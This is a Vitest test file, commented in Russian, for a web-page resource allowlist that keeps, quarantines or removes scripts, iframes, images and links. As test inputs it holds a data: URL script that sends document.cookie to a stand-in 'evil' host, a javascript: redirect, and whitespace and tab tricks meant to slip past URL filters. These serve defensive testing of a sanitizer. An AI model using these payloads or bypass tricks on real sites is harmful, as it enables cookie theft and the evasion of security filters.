import { describe, it, expect } from 'vitest';
import { classifyResource } from '../allowlist.js';

describe('classifyResource — белый список (default-deny)', () => {
  it('РЕГРЕССИЯ: фейковый CDN jsdeliveris.com НЕ остаётся', () => {
    // Точный кейс из продакшена: тайпсквоттинг cdn.jsdelivr.net
    const c = classifyResource(
      'https://jsdeliveris.com/ajax/libs/jquery/3.6.1/jquery.js',
      'script',
    );
    expect(c.action).not.toBe('keep');
    expect(c.action).toBe('quarantine');
  });

  it('настоящий CDN jsdelivr — оставляем', () => {
    const c = classifyResource(
      'https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js',
      'script',
    );
    expect(c.action).toBe('keep');
  });

  it('официальный jQuery CDN — оставляем', () => {
    expect(classifyResource('https://code.jquery.com/jquery-3.6.1.min.js', 'script').action).toBe('keep');
  });

  it('известный трекер — удаляем', () => {
    expect(classifyResource('https://www.google-analytics.com/analytics.js', 'script').action).toBe('remove');
    expect(classifyResource('https://connect.facebook.net/en_US/fbevents.js', 'script').action).toBe('remove');
  });

  it('локальные/относительные ссылки — оставляем (их разбирают другие проходы)', () => {
    expect(classifyResource('js/app.js', 'script').action).toBe('keep');
    expect(classifyResource('./vendor/jquery.js', 'script').action).toBe('keep');
    expect(classifyResource('/assets/main.js', 'script').action).toBe('keep');
  });

  it('внешний iframe вне белого списка — карантин', () => {
    expect(classifyResource('https://evil.example/redirect', 'iframe').action).toBe('quarantine');
  });

  it('протокол-относительный чужой хост — карантин', () => {
    expect(classifyResource('//tracker.xyz/steal.js', 'script').action).toBe('quarantine');
  });

  it('картинка с нашего S3/CloudFront — оставляем', () => {
    expect(classifyResource('https://hurryholebucket.s3.eu-west-3.amazonaws.com/p.png', 'img').action).toBe('keep');
    expect(classifyResource('https://d4tncaiqdi48w.cloudfront.net/v.mp4', 'media').action).toBe('keep');
  });

  it('картинка с чужого хоста — карантин', () => {
    expect(classifyResource('https://random-cdn.net/photo.png', 'img').action).toBe('quarantine');
  });

  it('трекер-пиксель (имя файла) с чужого хоста — удаляем', () => {
    // basename содержит 'pixel' → распознаётся как трекинг-пиксель
    expect(classifyResource('https://random-cdn.net/pixel.png', 'img').action).toBe('remove');
  });

  it('наш CloudFront НЕ доверен как источник скриптов', () => {
    // own-asset host годится для img/media, но не для script
    expect(classifyResource('https://d4tncaiqdi48w.cloudfront.net/app.js', 'script').action).toBe('quarantine');
  });
});

describe('classifyResource — нормализация URL (AL-2 / 2A-1)', () => {
  // Браузер по URL-спецификации обрезает ведущие/хвостовые пробелы и вырезает
  // внутренние \t\r\n из URL-атрибутов, после чего грузит хост. Чистильщик
  // обязан видеть тот же URL, что увидит браузер.
  it('ведущий пробел в src НЕ должен давать keep', () => {
    const c = classifyResource('  https://evil.com/x.js', 'script');
    expect(c.action).not.toBe('keep');
    expect(c.action).toBe('quarantine');
  });

  it('ведущий таб в src НЕ должен давать keep', () => {
    expect(classifyResource('\thttps://evil.com/p.png', 'img').action).not.toBe('keep');
  });

  it('внутренний перевод строки в схеме (https:/\\n/) НЕ должен давать keep', () => {
    expect(classifyResource('https:/\n/evil.com/x.js', 'script').action).not.toBe('keep');
  });

  it('таб внутри схемы (ht\\ttps://) НЕ должен давать keep', () => {
    expect(classifyResource('ht\ttps://evil.com/x.js', 'script').action).not.toBe('keep');
  });

  it('известный трекер с ведущим пробелом — всё равно remove', () => {
    expect(classifyResource('  https://www.google-analytics.com/analytics.js', 'script').action).toBe('remove');
  });

  it('доверенный CDN с ведущим пробелом — всё равно keep', () => {
    expect(
      classifyResource('  https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/x.min.js', 'script').action,
    ).toBe('keep');
  });
});

describe('classifyResource — классификация схемы (AL-1 / 2A-2 / 2D-1)', () => {
  it('data: в <script> → не keep (исполняемый чужой код)', () => {
    expect(
      classifyResource("data:text/javascript,fetch('//evil?'+document.cookie)", 'script').action,
    ).toBe('quarantine');
  });

  it('data: в <iframe> → не keep (произвольный HTML/JS)', () => {
    expect(classifyResource('data:text/html;base64,PHNjcmlwdD5ldmlsPC9zY3JpcHQ+', 'iframe').action).toBe(
      'quarantine',
    );
  });

  it('blob: в <script> → не keep', () => {
    expect(classifyResource('blob:https://evil.com/1234-uuid', 'script').action).toBe('quarantine');
  });

  it('filesystem: в <script> → не keep', () => {
    expect(classifyResource('filesystem:https://evil.com/temporary/x.js', 'script').action).toBe('quarantine');
  });

  it('javascript: в href → remove', () => {
    expect(classifyResource("javascript:location='//evil.com'", 'anchor').action).toBe('remove');
  });

  it('vbscript: в href → remove', () => {
    expect(classifyResource('vbscript:msgbox(1)', 'anchor').action).toBe('remove');
  });

  it('регистр+пробел в схеме (  JavaScript:) не обходят классификацию', () => {
    expect(classifyResource('  JavaScript:alert(1)', 'anchor').action).toBe('remove');
  });

  // ── Робастность: легитимные схемы НЕ должны блокироваться ──
  it('РОБАСТНОСТЬ: data:image/png в <img> остаётся keep (inline-картинки часты)', () => {
    expect(classifyResource('data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==', 'img').action).toBe('keep');
  });

  it('РОБАСТНОСТЬ: blob: в media остаётся keep (CSP media-src blob:)', () => {
    expect(classifyResource('blob:https://site.example/abcd-uuid', 'media').action).toBe('keep');
  });

  it('РОБАСТНОСТЬ: mailto:/tel: остаются keep (легитимные не-http схемы)', () => {
    expect(classifyResource('mailto:hi@example.com', 'anchor').action).toBe('keep');
    expect(classifyResource('tel:+15551234567', 'anchor').action).toBe('keep');
  });
});
